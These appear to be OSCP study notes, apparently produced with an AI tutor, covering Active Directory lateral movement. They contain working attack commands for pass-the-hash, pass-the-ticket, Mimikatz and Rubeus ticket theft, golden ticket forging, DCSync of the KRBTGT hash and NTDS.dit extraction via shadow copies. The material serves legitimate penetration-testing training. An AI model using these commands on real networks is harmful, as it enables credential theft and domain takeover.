# Module 24. Lateral Movement in Active Directory


## 24.1.1 WMI and WinRM

**WinRM**  (when port 5985 is open). You'll reach for it constantly on the exam.
```bash
evil-winrm -i <target> -u user -p password
# or with a hash
evil-winrm -i <target> -u user -H <NTLM_hash>
```

**WMI — SKIM.** 
```bash
impacket-wmiexec corp.com/user:password@<target>
```

**Conditions for evil-winrm (WinRM):**

1. **Port 5985 (HTTP) or 5986 (HTTPS) open** on the target — this is the WinRM service. Check with nmap.
2. **Valid credentials** — password or NTLM hash.
3. **The user must be in the "Remote Management Users" group OR be a local admin** — a normal domain user can't just WinRM in. This is the condition people forget.

```bash
# Password
evil-winrm -i <target> -u user -p password
# Pass-the-hash
evil-winrm -i <target> -u user -H <NTLM_hash>
```

Check WinRM availability:
```bash
crackmapexec winrm <target> -u user -p password
# If it shows (Pwn3d!), you can evil-winrm in
```

---

**Conditions for wmiexec (WMI):**

1. **Port 135 (RPC) open** plus the dynamic RPC range — WMI uses RPC.
2. **Valid credentials** — password or NTLM hash.
3. **The user must be a local administrator** on the target — WMI remote execution requires admin rights.
4. **Port 445 (SMB)** is also typically needed, since wmiexec retrieves command output via SMB.

```bash
# Password
impacket-wmiexec corp.com/user:password@<target>
# Pass-the-hash
impacket-wmiexec -hashes :<NTLM_hash> corp.com/user@<target>
```

---

**The comparison — which to use when:**

| | evil-winrm (WinRM) | wmiexec (WMI) |
|---|--------------------|--------------| 
| Port needed | 5985/5986 | 135 + 445 |
| Privilege needed | Remote Mgmt Users OR local admin | Local admin |
| Shell quality | Full interactive shell | Semi-interactive |
| Service created | No | No (stealthier than psexec) |

**The decision logic:**
- Port 5985 open + creds → **evil-winrm** (nicer shell)
- Port 5985 closed but you're admin + 135/445 open → **wmiexec**
- Both blocked → try **psexec** (needs 445 + admin)

**The universal condition across all three:**
You need **admin-level access** on the target (except WinRM also accepts Remote Management Users group). Lateral movement tools almost always require you to already be admin on the destination machine — which is why finding where your credentials have admin rights (via `crackmapexec` showing `Pwn3d!`) is the key enumeration step before choosing a tool.

**One-sentence summary:**
evil-winrm needs port 5985 + creds + (admin or Remote Management Users); wmiexec needs port 135/445 + creds + local admin. Both require you to already have privileged access on the target — the tool is just how you turn that access into a shell.

---

## 24.1.2 PsExec

**What PsExec does:**
Gives you a **SYSTEM shell** on a remote Windows machine using credentials or a hash. It's the go-to for "I have admin creds on that box, get me a shell."

**How it works under the hood** (you learned this earlier):
1. Connects to the target via SMB (port 445)
2. Uploads a service binary to the ADMIN$ share
3. Creates and starts a Windows service that runs it
4. Gives you a SYSTEM shell
5. Cleans up the service/binary on exit

**The conditions:**
1. **Port 445 (SMB) open**
2. **Local admin** on the target (needed to write to ADMIN$ and create a service)
3. **ADMIN$ share accessible** (default on, but some hardened boxes disable it)

**Usage:**

```bash
# With password
impacket-psexec corp.com/administrator:'password'@<target>

# With hash (Pass-the-Hash)
impacket-psexec -hashes :<NTLM_hash> corp.com/administrator@<target>
```

**What makes it powerful:**
You land as **NT AUTHORITY\SYSTEM** — the highest privilege — immediately. No further escalation needed on that box.

**The trade-off (why you'd sometimes pick wmiexec instead):**
PsExec is **noisy** — it creates a service, writes a binary to disk, generates event logs. On the exam this doesn't matter (you're not evading a blue team), so PsExec's reliability and SYSTEM shell make it the default choice. In real engagements, wmiexec is stealthier.

**The comparison across your lateral movement tools:**

| Tool | Lands you as | Noise | Port |
|------|-------------|-------|------|
| psexec | SYSTEM | High (creates service) | 445 |
| wmiexec | admin user | Lower | 135+445 |
| evil-winrm | admin user (elevated) | Low | 5985 |

**For OSCP:**
PsExec is your reliable "get me a SYSTEM shell now" tool when you have admin creds and port 445. It's often the fastest path once you've compromised credentials that show `(Pwn3d!)` in crackmapexec.

**The workflow:**
```
1. crackmapexec smb <targets> -u user -p pass  →  find where you see (Pwn3d!)
2. impacket-psexec user:pass@<pwned_host>  →  SYSTEM shell
3. whoami  →  nt authority\system
4. Grab flags, dump credentials, continue
```

---

## 24.1.4 Overpass the hash

**Overpass-the-Hash** — using an NTLM hash to get a **Kerberos ticket**, then using that ticket to authenticate.

**The concept — why it exists:**

Regular Pass-the-Hash uses the NTLM hash directly over NTLM authentication. But some environments disable NTLM or monitor for it. Overpass-the-Hash "upgrades" your NTLM hash into a Kerberos ticket — so you authenticate via Kerberos instead, which looks more legitimate and works where NTLM is blocked.

The name: you take a **hash** (NTLM) and turn it into something you can use **over** Kerberos. Hence "overpass-the-hash" — it bridges NTLM hash → Kerberos.

**The flow:**
```
NTLM hash → request a TGT (Kerberos ticket) → use the ticket to access services
```

**How you do it:**

**With Impacket (from Kali):**
```bash
# Use the NTLM hash to request a TGT
impacket-getTGT corp.com/user -hashes :<NTLM_hash>

# This creates user.ccache
export KRB5CCNAME=user.ccache

# Now use the ticket (pass-the-ticket) for lateral movement
impacket-psexec -k -no-pass corp.com/user@<target>
```

**With Rubeus (on Windows):**
```cmd
Rubeus.exe asktgt /user:administrator /rc4:<NTLM_hash> /ptt
```
The `/ptt` injects the ticket directly into your session.

**The distinction between the three "pass" attacks:**

| Attack | What you have | What you use it as |
|--------|--------------|-------------------|
| Pass-the-Hash | NTLM hash | Authenticate via NTLM directly |
| Overpass-the-Hash | NTLM hash | Convert to Kerberos ticket, use via Kerberos |
| Pass-the-Ticket | Kerberos ticket | Use the ticket directly |

**Overpass-the-Hash is the bridge:** it starts with a hash (like PtH) but ends up using Kerberos (like PtT).

**When you'd use it on OSCP:**
- NTLM is disabled on the target (PtH won't work)
- You want to use Kerberos-based access with only a hash
- Less common than plain PtH, but good to know

**summary:**
Overpass-the-Hash converts an NTLM hash into a Kerberos TGT (via `impacket-getTGT` or Rubeus), letting you authenticate over Kerberos instead of NTLM — useful when NTLM is blocked, bridging pass-the-hash and pass-the-ticket.

Overpass-the-hash gives you a ticket as that user — you inherit exactly that user's permissions, no more, no less. If the user is a regular user, you get regular access. If the user is an admin on web04, you get admin access on web04.

---

## 24.1.5 Pass the Ticket 

**Pass-the-Ticket** — using a stolen or forged Kerberos ticket to authenticate as that user.

**The concept:**

Instead of using a password or hash, you use an actual **Kerberos ticket**. You steal a ticket from a machine's memory (or forge one), inject it into your session, and now you authenticate as whoever that ticket belongs to.

**How it differs from the other "pass" attacks:**

| Attack | You start with | 
|--------|---------------|
| Pass-the-Hash | NTLM hash → use over NTLM |
| Overpass-the-Hash | NTLM hash → convert to Kerberos ticket |
| **Pass-the-Ticket** | **an actual Kerberos ticket → use it directly** |

Pass-the-Ticket skips the hash entirely — you already have a ticket, you just use it.

**Where you get tickets:**

1. **Steal from memory** — on a compromised machine, extract Kerberos tickets that users left in memory
2. **Forge them** — silver/golden tickets (which you learned) ARE pass-the-ticket, using forged tickets

**Stealing tickets on Windows (Rubeus):**
```cmd
# Dump all tickets from memory
Rubeus.exe dump

# Or triage to see what's available
Rubeus.exe triage
```

This shows tickets in memory. If a Domain Admin has a ticket cached there, you steal it.

**Injecting a stolen ticket (pass-the-ticket):**
```cmd
# Inject a base64 ticket into your session
Rubeus.exe ptt /ticket:<base64_ticket>
```

After injection, `klist` shows the ticket, and you can access resources as that user.

**From Kali (Impacket):**

If you have a `.ccache` ticket file:
```bash
export KRB5CCNAME=stolen_ticket.ccache
impacket-psexec -k -no-pass corp.com/user@target
```

The `-k` flag tells Impacket to use Kerberos (the ticket) instead of a password.


**The conditions:**

1. You need an **actual Kerberos ticket** — stolen from memory (requires admin/SYSTEM on the machine you steal from) or forged
2. The ticket must be **valid** (not expired — tickets have lifetimes)
3. To access a service, the ticket's user must have **permission** for that service

**The workflow:**
```
1. Compromise a machine (get SYSTEM/admin)
2. Rubeus dump / triage  →  find tickets in memory
3. Find a privileged user's ticket (e.g. a Domain Admin who logged in)
4. Rubeus ptt /ticket:<theirs>  →  inject it
5. klist  →  confirm you have their ticket
6. Access resources as that user  →  own the domain
```

**Why it's powerful:**

If a Domain Admin ever logged into a machine you control, their ticket might still be in memory. You steal it and become them — no password or hash cracking needed. This is a common privilege escalation in AD.

**The connection to what you've learned:**
- Silver ticket = forge a TGS, then pass-the-ticket
- Golden ticket = forge a TGT, then pass-the-ticket
- Stolen ticket = steal from memory, then pass-the-ticket

All three end with **injecting a ticket and using it** — that injection IS pass-the-ticket.

**For OSCP:**
Know the technique. The most common practical use is: you get SYSTEM on a box, dump tickets with Rubeus, find a privileged user's ticket, inject it, and pivot with their access. Also underpins silver/golden tickets.

**One-sentence summary:**
Pass-the-Ticket injects an actual Kerberos ticket (stolen from a machine's memory with Rubeus, or forged) into your session so you authenticate as that user — no password or hash needed, just the ticket itself.

---

### Pass the Ticket using mimikatz

This is a complete pass-the-ticket attack using Mimikatz. Let me walk through exactly what each line does.

**Line 1:**
```
privilege::debug
```
Enables SeDebugPrivilege so Mimikatz can access other processes' memory (LSASS specifically). You've seen this before — it's the standard first step for Mimikatz to read protected memory. Requires admin/SYSTEM.

**Line 2:**
```
sekurlsa::tickets /export
```
This extracts all Kerberos tickets currently in memory and **exports them to `.kirbi` files** on disk. Each ticket cached in LSASS (from any logged-on user) gets saved as a file.

The output files are named like:
```
[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```
This filename tells you:
- `dave` — the user the ticket belongs to
- `cifs-web04` — the service (cifs = SMB file share on web04)
- So this is dave's service ticket for accessing web04's file shares

**Line 3:**
```
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```
`ptt` = pass-the-ticket. This **injects** dave's exported ticket into your current session. Now your session holds dave's ticket for the cifs/web04 service.

**Line 4:**
```
ls \\web04\backup
```
You access web04's `backup` share. Because you injected dave's cifs ticket, Windows uses it automatically — you're accessing web04 **as dave**, using his stolen ticket, without needing his password or hash.

**The complete attack in plain English:**

```
1. privilege::debug        → get permission to read memory
2. sekurlsa::tickets /export → steal all tickets from memory, save to files
3. kerberos::ptt <dave's ticket> → inject dave's ticket into your session
4. ls \\web04\backup       → access web04 as dave using his ticket
```

**What made this possible:**
dave had logged into the machine you compromised, leaving his Kerberos ticket in memory. You extracted it and reused it — classic pass-the-ticket.

**The condition that made it work:**
- You had admin/SYSTEM on the machine (needed for `privilege::debug` and reading LSASS)
- dave's ticket was in memory (he had authenticated there)
- dave had access to web04's backup share (so his ticket grants that access)

**Mimikatz vs Rubeus for the same attack:**

| Step | Mimikatz | Rubeus |
|------|----------|--------|
| Extract tickets | `sekurlsa::tickets /export` | `Rubeus.exe dump` |
| Inject ticket | `kerberos::ptt <file>` | `Rubeus.exe ptt /ticket:<b64>` |

Both do identical things — steal tickets from memory, inject one to impersonate that user. Mimikatz exports to `.kirbi` files; Rubeus can work with base64 directly.

**The key insight for OSCP:**
When you compromise a machine, dumping tickets reveals **which users authenticated there**. If a privileged user's ticket is present, you steal it and inherit their access — a powerful lateral movement / escalation path. The filename tells you whose ticket it is and what service it's for, so you pick the useful one.

---

## 24.1.6 DCOM

**DCOM — the last and most niche lateral movement technique.** I'll keep this brief since it's SKIM priority for OSCP.

**What DCOM is:**

DCOM (Distributed Component Object Model) lets Windows programs communicate with each other across the network. Some DCOM objects expose methods that can execute commands — and that's what attackers abuse for remote code execution.

**The concept:**

Certain DCOM applications (like MMC20.Application, ShellWindows, ShellBrowserWindow) have methods that let you run commands. If you have admin access to a remote machine, you can invoke these DCOM methods remotely to execute code — another way to move laterally without PsExec or WinRM.

**How it works (PowerShell example):**
```powershell
# Create a DCOM instance on the remote target
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","<target_IP>"))

# Use its ExecuteShellCommand method to run something
$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")
```

**From Kali (Impacket):**
```bash
impacket-dcomexec corp.com/administrator:'password'@<target>
```
This works like psexec/wmiexec but uses DCOM as the execution mechanism.

**The conditions:**
1. **Local admin** on the target (DCOM remote execution requires it)
2. **Ports 135 (RPC) + dynamic RPC range** open
3. Often **445 (SMB)** for output retrieval

**Why it exists as a technique:**

It's an **alternative** when psexec, wmiexec, and WinRM are blocked or monitored. DCOM is a less-common execution vector, so it sometimes slips past defenses that watch for the more obvious methods.

**Your lateral movement toolkit — the full picture now:**

| Tool | Mechanism | Port | Impacket command |
|------|-----------|------|-----------------|
| PsExec | SMB service | 445 | `impacket-psexec` |
| WMI | WMI/RPC | 135+445 | `impacket-wmiexec` |
| WinRM | WinRM | 5985 | `evil-winrm` |
| DCOM | DCOM/RPC | 135+445 | `impacket-dcomexec` |

All four achieve the same goal — remote code execution as an admin user. They differ in mechanism and what ports/services they need. If one is blocked, you try another.

**For OSCP:**
DCOM is the **least common** of the four. Know it exists as a fallback. Your primary tools remain psexec, wmiexec, and evil-winrm. If all three are somehow blocked but 135 is open, dcomexec is your backup.

**One-sentence summary:**
DCOM lateral movement abuses Windows COM objects that expose command-execution methods, letting you run code on a remote machine where you have admin rights — a fallback lateral movement vector (`impacket-dcomexec`) for when psexec/wmiexec/winrm are blocked.

---

## 24.2.1 Golden Ticket 

**Golden Ticket** — the ultimate AD persistence technique. You've already met the concept via silver tickets, so this builds on that.

**What a golden ticket is:**

A forged **TGT (Ticket Granting Ticket)** that grants access to the **entire domain** as any user you want — typically a Domain Admin. Because you forge the TGT itself, you can request tickets for ANY service as ANYONE.

**Silver vs Golden (recap):**

| | Silver Ticket | Golden Ticket |
|---|--------------|---------------|
| Forged with | A service account's hash | The **KRBTGT** account's hash |
| Grants | ONE service on ONE host | The ENTIRE domain, any service |
| Scope | Narrow | Total domain control |

**The KRBTGT account — the key to everything:**

Every domain has a special account called **KRBTGT**. Its password hash is used to encrypt/sign **every TGT** in the domain. If you have the KRBTGT hash, you can forge TGTs that the entire domain will accept as valid — because the domain trusts anything signed with the KRBTGT key.

**How you get the KRBTGT hash: (complete escalation)**

You need to have already compromised the domain — specifically via **DCSync** (which you learned) or by dumping the DC's NTDS.dit:
```bash
# DCSync the KRBTGT hash (requires DA or replication rights)
impacket-secretsdump corp.com/administrator:'password'@<DC_IP> -just-dc-user krbtgt
```

**Forging the golden ticket:**

**With Impacket (Kali):**
```bash
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain corp.com Administrator

#<any_target> must be the hostname, etc. dc1.corp.com
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.com/Administrator@<any_target>
```

---

**With Mimikatz (Windows): (not escalated but KRBTGT hash exist)**
```
kerberos::golden /user:Administrator /domain:corp.com /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt

misc::cmd
```

**What you need to forge it:**
1. The **KRBTGT hash** (from DCSync)
2. The **domain SID** (the shared prefix, which you learned about)
3. The username to impersonate (Administrator)
4. The domain name

**The critical insight — why it's persistence, not escalation:**

To make a golden ticket, you need the KRBTGT hash, which requires **already owning the domain** (via DCSync as Domain Admin). So a golden ticket doesn't GET you domain admin — you already had it.

Its value is **persistence**: once you have the KRBTGT hash, you can forge valid tickets **forever**, even after the admins reset passwords or remove your accounts. The only way to invalidate golden tickets is to reset the KRBTGT password **twice** — which admins rarely do.

So a golden ticket is a **backdoor** — you've owned the domain, and now you can always come back as any user, because you hold the master key (KRBTGT).

**Why the KRBTGT hash is so dangerous:**

```
KRBTGT hash = the key that signs all tickets in the domain
   ↓
Forge a TGT for any user (even fake ones)
   ↓
The domain accepts it as valid (it's signed correctly)
   ↓
Access anything, as anyone, indefinitely
```

**For OSCP:**

- Should be only considered if KRBTGT hash exist for some reason.
- Understand the concept: KRBTGT hash → forge TGTs → domain-wide persistence

**The relationship to your whole AD journey:**

```
Enumerate (BloodHound) → find path
   ↓
Roast / ACL abuse / lateral movement → gain privileges
   ↓
Reach Domain Admin
   ↓
DCSync → dump all hashes including KRBTGT
   ↓
Golden Ticket → permanent domain persistence (the victory lap)
```

---

### 24.2.2 Shadow Copies

**What it is:**
Volume Shadow Copy Service (VSS) is a Windows feature that creates point-in-time snapshots of a volume, even of files that are locked/in-use. Backup software uses it legitimately.

**The attack:**
On a Domain Controller, the file **NTDS.dit** (the database containing all domain password hashes) is locked while the system runs — you can't just copy it. Shadow copies bypass this: you create a snapshot, then copy NTDS.dit from the snapshot (where it's not locked).

**The criteria:**
- **Admin/SYSTEM on the Domain Controller** (this is the main requirement)
- You're extracting hashes, so you must already have high privilege on the DC

**The steps:**
```cmd
# 1. Create a shadow copy of C:
vssadmin create shadow /for=C:

# 2. Copy NTDS.dit from the shadow copy (path from step 1's output)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ntds.dit

# 3. Also grab the SYSTEM registry hive (needed to decrypt)
reg save HKLM\SYSTEM C:\system.hive
```

Then extract hashes offline on Kali:
```bash
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
```

**When to use it:**
It's an **alternative to DCSync** for dumping all domain hashes. Use it when:
- You have admin on the DC but want NTDS.dit directly
- DCSync isn't working for some reason

**DCSync vs Shadow Copies:**

| | DCSync | Shadow Copies |
|---|--------|---------------|
| Needs | Replication rights (can be non-DA) | Admin/SYSTEM on the DC |
| Location | Remote (from Kali) | On the DC |
| Method | Impersonate a DC, request replication | Snapshot the disk, copy NTDS.dit |
| Result | Domain hashes | Domain hashes (same result) |

**The key distinction:**
- **DCSync** — remote, needs only replication rights, cleaner. Often the escalation path.
- **Shadow copies** — requires you to already be admin on the DC. More of a "you're already here, grab everything" method.

**For OSCP:**
**Skim-level.** Know it exists as a way to extract NTDS.dit when you have DC admin. DCSync is more commonly the intended path (especially since it can work from a non-DA account with replication rights). Shadow copies is the backup method for when you're already SYSTEM on the DC and want the hash database directly.

**One-sentence summary:**
Shadow copies create a filesystem snapshot to extract the locked NTDS.dit hash database from a Domain Controller (requires DC admin), giving you all domain hashes — an alternative to DCSync for when you're already privileged on the DC.

That completes module 24. You've now covered all of Active Directory. Want to knock out Metasploit next, or jump into a challenge lab to start assembling the full AD methodology with Ligolo?

